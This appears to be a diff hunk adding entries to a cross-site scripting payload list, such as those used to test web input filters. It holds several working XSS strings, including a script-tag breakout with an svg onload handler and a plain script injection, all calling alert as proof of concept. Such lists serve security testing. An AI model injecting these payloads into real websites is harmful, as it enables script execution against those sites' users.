@@ -103,3 +103,7 @@ asd%00');prompt('1
 
 %27%3B%21-alert%26%23x28%3B1%26%23x29%3B%2f%2f
 
+</script/* --><svg/onload=alert(/XSS/.source)//
+
+</script/><script>alert(1)</script/>
+
